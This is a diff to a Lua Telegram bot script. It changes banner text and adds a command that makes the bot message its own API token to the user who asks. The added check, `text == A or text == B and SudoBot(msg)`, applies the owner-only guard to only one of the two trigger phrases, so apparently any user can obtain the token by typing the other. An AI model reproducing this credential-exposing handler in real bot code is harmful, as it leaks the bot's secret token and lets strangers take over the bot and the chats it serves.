@@ -2718,10 +2718,10 @@ end
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'source' then
 local msg_id = msg.id_/2097152/0.5
 local Text = [[
-    ╭━━━━━━❲¹𝐀𝐋𝐒𝐘𝐀𝐃¹❳━━━━━━╮
+    ╭━━━━━━❲𝐀𝐋𝐒𝐘𝐀𝐃❳━━━━━━╮
     ☞𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 
     ☞ 𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙾𝙽 
-    ╰━━━━━━❲¹𝐀𝐋𝐒𝐘𝐀𝐃¹﴿━━━━━━╯
+    ╰━━━━━━❲𝐀𝐋𝐒𝐘𝐀𝐃━━━━━━╯
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -2729,6 +2729,11 @@ keyboard.inline_keyboard = {
 {{text = '  ◍ M𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻𝚂 𖣌 ', url="t.me/SO_ALSIYAD"}},
 {{text = '   ²₀²₁ ˝₀₄˝₁₃ | ₁₂:₀₀ 𝙿𝙼  ', url="t.me/SO_ALSIYAD"}},
 }https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SO_ALSIYAD&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end
+
+if text == "توكن البوت" or text == 'التوكن' and SudoBot(msg) then
+https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.sender_user_id_ .. '&text=' ..token)
+send(msg.chat_id_, msg.id_,' تم ارسال توكن البوت في الخاص')
 end
 
 if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
